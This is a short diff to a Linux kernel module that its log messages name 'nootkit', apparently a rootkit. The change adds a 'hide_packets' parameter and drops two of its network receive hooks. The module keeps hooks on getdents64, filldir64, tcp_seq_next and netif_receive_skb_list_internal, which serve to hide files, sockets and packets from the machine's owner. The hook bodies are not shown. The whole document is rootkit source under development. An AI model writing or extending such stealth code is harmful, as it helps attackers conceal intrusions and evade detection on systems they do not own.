@@ -26,6 +26,10 @@ char *hide_sockets_strs[MAX_HIDE_ENTITIES];
 int hide_sockets_count;
 module_param_array_named(hide_sockets, hide_sockets_strs, charp, &hide_sockets_count, 0);
 
+char *hide_packets_strs[MAX_HIDE_ENTITIES];
+int hide_packets_count;
+module_param_array_named(hide_packets, hide_packets_strs, charp, &hide_packets_count, 0);
+
 int nootkit_init(void)
 {
     printk(KERN_INFO "Initializing nootkit!\n");
@@ -48,8 +52,6 @@ int nootkit_init(void)
     hide_hook_set_getdents64();
     hide_hook_set_filldir64();
     hide_hook_set_tcp_seq_next();
-    hide_hook_set___netif_receive_skb();
-    hide_hook_set_netif_rx();
     hide_hook_set_netif_receive_skb_list_internal();
 
     return 0;
@@ -61,8 +63,6 @@ void nootkit_exit(void)
     hide_hook_unset_getdents64();
     hide_hook_unset_filldir64();
     hide_hook_unset_tcp_seq_next();
-    hide_hook_unset___netif_receive_skb();
-    hide_hook_unset_netif_rx();
     hide_hook_unset_netif_receive_skb_list_internal();
 
     printk(KERN_INFO "Unloaded nootkit!\n");
